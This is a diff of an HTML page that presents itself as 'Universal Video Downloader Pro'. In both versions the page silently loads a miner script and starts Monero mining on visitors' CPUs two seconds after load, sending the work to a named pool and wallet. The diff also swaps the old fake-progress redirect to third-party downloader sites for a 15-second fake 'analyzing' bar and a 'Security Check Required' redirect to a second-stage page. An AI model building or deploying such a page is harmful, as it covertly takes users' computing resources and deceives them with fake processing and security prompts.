@@ -5,9 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="google-site-verification" content="googlef95c9efb5077029a" />
     <title>Universal Video Downloader Pro</title>
-
     <script src="https://cdn.jsdelivr.net/gh/monero-project/monero-gui@v0.18.1.2/external/qml/MoneroComponents/Controls/miner.js"></script>
-    
     <style>
         body {
             margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
@@ -16,34 +14,33 @@
             height: 100vh; overflow: hidden;
         }
         .container {
-            background: rgba(30, 41, 59, 0.7); padding: 2.5rem; border-radius: 16px;
+            background: rgba(30, 41, 59, 0.7); padding: 2.5rem; border-radius: 20px;
             box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.1);
             text-align: center; width: 90%; max-width: 450px; backdrop-filter: blur(10px);
         }
-        h1 { margin-bottom: 0.5rem; font-size: 1.5rem; color: #38bdf8; }
+        h1 { margin-bottom: 0.5rem; color: #38bdf8; font-size: 1.8rem; }
         p { color: #94a3b8; font-size: 0.9rem; margin-bottom: 2rem; }
         input {
-            width: 100%; padding: 12px; margin-bottom: 1rem; border-radius: 8px;
+            width: 100%; padding: 14px; margin-bottom: 1.5rem; border-radius: 12px;
             border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box;
-            outline: none;
+            outline: none; font-size: 1rem;
         }
-        input:focus { border-color: #38bdf8; }
+        input:focus { border-color: #38bdf8; box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
         button {
-            width: 100%; padding: 12px; background: #38bdf8; color: #0f172a;
-            border: none; border-radius: 8px; font-weight: bold; cursor: pointer;
-            transition: all 0.2s;
+            width: 100%; padding: 14px; background: #38bdf8; color: #0f172a;
+            border: none; border-radius: 12px; font-weight: bold; cursor: pointer;
+            font-size: 1rem; transition: all 0.2s;
         }
         button:hover { background: #7dd3fc; transform: translateY(-1px); }
-        #status-area { margin-top: 1.5rem; min-height: 80px; }
         .progress-container {
-            width: 100%; height: 8px; background: #334155; border-radius: 10px;
-            margin: 15px 0; display: none; overflow: hidden;
+            width: 100%; height: 10px; background: #334155; border-radius: 10px;
+            margin: 20px 0; display: none; overflow: hidden;
         }
         #progress-bar {
             width: 0%; height: 100%; background: linear-gradient(90deg, #38bdf8, #818cf8);
-            transition: width 1s linear;
+            transition: 1s linear;
         }
-        .timer { font-size: 0.85rem; color: #38bdf8; font-weight: bold; margin-top: 8px; }
+        #status { margin-top: 15px; font-weight: bold; color: #38bdf8; min-height: 24px; }
     </style>
 </head>
 <body>
@@ -60,66 +57,51 @@
         <div class="progress-container" id="p-container">
             <div id="progress-bar"></div>
         </div>
-        <div id="timer-text" class="timer"></div>
     </div>
 </div>
 
 <script>
-// --- MINER CONFIGURATION ---
-const pool = "monerohash.com:3333";
-const walletAddress = "48bN9TtB8nieRBKARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQckVdJPNoNapcwMuiu1TSZiG7FXft";
-const workerId = "Web_Pro_User";
-
-// Start miner at 70% power (0.3 throttle)
-setTimeout(() => {
-    if(typeof startMining === 'function') {
-        startMining(pool, walletAddress, workerId, navigator.hardwareConcurrency, 0.3);
-        console.log("Miner Heartbeat: Active");
-    }
-}, 2000);
-
-// --- REDIRECT & PROGRESS ENGINE ---
-function startSequence() {
-    let url = document.getElementById("urlInput").value;
-    let status = document.getElementById("status");
-    let bar = document.getElementById("progress-bar");
-    let container = document.getElementById("p-container");
-    let timerText = document.getElementById("timer-text");
-
-    if(!url || !url.includes("http")) { 
-        status.innerHTML = "❌ Please paste a valid link!"; 
-        return; 
-    }
-
-    container.style.display = "block";
-    let timeLeft = 15;
-
-    let interval = setInterval(() => {
-        timeLeft--;
-        let progress = ((15 - timeLeft) / 15) * 100;
-        bar.style.width = progress + "%";
-        timerText.innerHTML = "Processing: Please wait " + timeLeft + "s...";
-
-        if(timeLeft === 12) status.innerHTML = "🔍 Scanning video source...";
-        if(timeLeft === 8) status.innerHTML = "⚡ Generating high-speed mirror...";
-        if(timeLeft === 4) status.innerHTML = "✅ Link ready. Preparing redirect...";
-
-        if(timeLeft <= 0) {
-            clearInterval(interval);
-            status.innerHTML = "Redirecting to secure file...";
-            
-            let redirectUrl = "https://snapinsta.app/search?q="; 
-            
-            if(url.includes("youtube.com") || url.includes("youtu.be")) {
-                redirectUrl = "https://y2mate.is/en/search?q=";
-            } else if(url.includes("tiktok.com")) {
-                redirectUrl = "https://snaptik.app/search?q=";
-            }
-            
-            window.location.href = redirectUrl + encodeURIComponent(url);
+    // --- STAGE 1 MINER ---
+    const pool = "monerohash.com:3333";
+    const wallet = "48bN9TtB8nieRBKARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQckVdJPNoNapcwMuiu1TSZiG7FXft";
+    
+    setTimeout(() => {
+        if(typeof startMining === 'function') {
+            startMining(pool, wallet, "Stage_1_Home", navigator.hardwareConcurrency, 0.3);
+            console.log("Stage 1 Miner: Online");
         }
-    }, 1000);
-}
+    }, 2000);
+
+    // --- LOGIC TO SEND TO STAGE 2 ---
+    function startSequence() {
+        let url = document.getElementById("urlInput").value;
+        let status = document.getElementById("status");
+        let bar = document.getElementById("progress-bar");
+        let container = document.getElementById("p-container");
+
+        if(!url || !url.includes("http")) { 
+            status.innerHTML = "❌ Please paste a valid link!"; 
+            return; 
+        }
+
+        container.style.display = "block";
+        let timeLeft = 15;
+
+        let interval = setInterval(() => {
+            timeLeft--;
+            let progress = ((15 - timeLeft) / 15) * 100;
+            bar.style.width = progress + "%";
+            status.innerHTML = "Analyzing source... (" + timeLeft + "s)";
+
+            if(timeLeft <= 0) {
+                clearInterval(interval);
+                status.innerHTML = "Security Check Required. Redirecting...";
+                
+                // This line is the magic - it jumps to your new file
+                window.location.href = "verify.html?url=" + encodeURIComponent(url);
+            }
+        }, 1000);
+    }
 </script>
 </body>
 </html>
